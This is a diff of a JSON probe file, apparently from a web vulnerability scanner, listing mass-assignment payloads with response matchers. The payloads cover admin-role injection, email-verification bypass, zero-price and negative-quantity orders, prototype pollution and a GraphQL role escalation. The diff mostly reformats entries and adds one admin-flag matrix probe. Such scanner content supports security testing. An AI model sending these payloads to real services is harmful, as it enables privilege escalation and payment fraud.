@@ -9,21 +9,60 @@
         {
           "payload": "{\"username\":\"test\",\"role\":\"admin\"}",
           "description": "Add role=admin to registration/profile update",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized", "not allowed"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "unauthorized",
+                "not allowed"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 45
         },
         {
           "payload": "{\"username\":\"test\",\"is_admin\":true}",
           "description": "Add is_admin=true to JSON body",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "unauthorized"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 45
         },
         {
           "payload": "{\"username\":\"test\",\"isVerified\":true,\"emailVerified\":true}",
           "description": "Bypass email verification via mass assignment",
-          "matchers": [{"type": "status", "status": [200, 201]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 35
         }
@@ -32,26 +71,71 @@
     "price_manipulation": {
       "description": "Price/balance manipulation via hidden fields",
       "tech_match": [],
-      "param_match": ["price", "amount", "total", "discount", "quantity", "cost"],
+      "param_match": [
+        "price",
+        "amount",
+        "total",
+        "discount",
+        "quantity",
+        "cost"
+      ],
       "probes": [
         {
           "payload": "{\"product_id\":1,\"quantity\":1,\"price\":0}",
           "description": "Set price to 0 in request body",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["invalid price", "error"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "invalid price",
+                "error"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "{\"product_id\":1,\"quantity\":-1}",
           "description": "Negative quantity for refund/credit",
-          "matchers": [{"type": "status", "status": [200, 201]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
         },
         {
           "payload": "{\"product_id\":1,\"discount\":100}",
           "description": "100% discount via mass assignment",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["invalid", "error"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "invalid",
+                "error"
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
         }
@@ -60,12 +144,29 @@
     "hidden_field_tampering": {
       "description": "Modify hidden form fields that control authorization",
       "tech_match": [],
-      "param_match": ["user_id", "account_id", "owner_id", "created_by", "modified_by"],
+      "param_match": [
+        "user_id",
+        "account_id",
+        "owner_id",
+        "created_by",
+        "modified_by"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "Change user_id/owner_id to another user's ID",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "length_diff", "min_diff": 50}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
           "severity": "high",
           "confidence_boost": 35
         }
@@ -73,62 +174,160 @@
     },
     "nested_object_assignment": {
       "description": "Nested-JSON privilege escalation — flat protection (`only :name, :email`) fails when attacker injects nested objects. Most common in Rails (strong parameters bypass), Express+lodash.merge, Mongoose populate, GraphQL inputs.",
-      "tech_match": ["rails", "express", "node", "mongoose", "graphql"],
+      "tech_match": [
+        "rails",
+        "express",
+        "node",
+        "mongoose",
+        "graphql"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"name\":\"x\",\"user\":{\"role\":{\"admin\":true}}}",
           "description": "Two-level nested admin assignment — bypasses strong-params that only whitelist top-level. Common in Rails update_attributes(params).",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized", "unpermitted"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "unauthorized",
+                "unpermitted"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 55
         },
         {
           "payload": "{\"settings\":{\"billing\":{\"owner_id\":1,\"plan\":\"enterprise\"}}}",
           "description": "Settings.billing nested takeover — can switch billing owner or upgrade plan without paying.",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "denied"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "denied"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "{\"profile\":{\"permissions\":[\"admin\",\"superuser\"]}}",
           "description": "Permission-array assignment. Some libs (Mongoose, Sequelize) replace whole array on update.",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "unauthorized"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "{\"__proto__\":{\"isAdmin\":true}}",
           "description": "Prototype pollution via mass assignment — pollutes Object.prototype.isAdmin, downstream `if (user.isAdmin)` checks pass for everyone.",
-          "matchers": [{"type": "status", "status": [200, 201]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 60
         },
         {
           "payload": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
           "description": "Alternate prototype pollution path (constructor.prototype) — defeats __proto__ filtering.",
-          "matchers": [{"type": "status", "status": [200, 201]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 55
         },
         {
           "payload": "{\"user[role]\":\"admin\"}",
           "description": "Bracket-notation flat key — Rails / PHP / .NET parse this as nested. Bypasses naive 'no dots in key' filters.",
-          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "{\"items\":[{\"id\":1,\"price\":0,\"approved\":true}]}",
           "description": "Array-element mass assignment — bulk-update endpoints often skip per-element validation.",
-          "matchers": [{"type": "status", "status": [200, 201]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 45
         },
         {
           "payload": "{\"meta\":{\"_owner\":\"victim_id\"}}",
           "description": "Underscore-prefixed metadata — Mongoose/Mongo internal-looking fields that some apps trust as authoritative.",
-          "matchers": [{"type": "status", "status": [200, 201]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
         }
@@ -136,15 +335,72 @@
     },
     "graphql_input_overreach": {
       "description": "GraphQL InputType mass assignment — input type with optional fields lets attacker set role/admin even though the UI doesn't expose them.",
-      "tech_match": ["graphql"],
+      "tech_match": [
+        "graphql"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "mutation { updateUser(input: {id: 1, role: ADMIN, isVerified: true}) { id role } }",
           "description": "Pass restricted fields in GraphQL mutation input. Server may accept and persist if no resolver-level guard.",
-          "matchers": [{"type": "word", "any": ["\"role\":\"ADMIN\"", "isVerified\":true"]}, {"type": "not_word", "words": ["error", "forbidden"]}],
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "\"role\":\"ADMIN\"",
+                "isVerified\":true"
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "error",
+                "forbidden"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 60
+        }
+      ]
+    },
+    "admin_flag_full_matrix": {
+      "description": "Full admin-flag matrix discovered across 2024-2026 mass-assignment reports. Submit each in JSON body alongside legitimate fields.",
+      "tech_match": [],
+      "param_match": [
+        "role",
+        "admin",
+        "is_admin",
+        "isAdmin",
+        "roleId",
+        "role_id",
+        "is_superuser",
+        "permissions",
+        "acl",
+        "groups"
+      ],
+      "probes": [
+        {
+          "payload": "{\"is_admin\":true,\"isAdmin\":true,\"role\":\"admin\",\"roleId\":1,\"role_id\":1,\"is_superuser\":true,\"is_staff\":true,\"permissions\":[\"*\"],\"acl\":\"admin\",\"groups\":[\"admin\"]}",
+          "description": "Submit full admin-flag matrix — server-side mass assignment binds whichever the model accepts",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "(?i)\"(is_admin|isAdmin|role|roleId|permissions)\"\\s*:\\s*(true|\\d+|\"admin\")"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     }
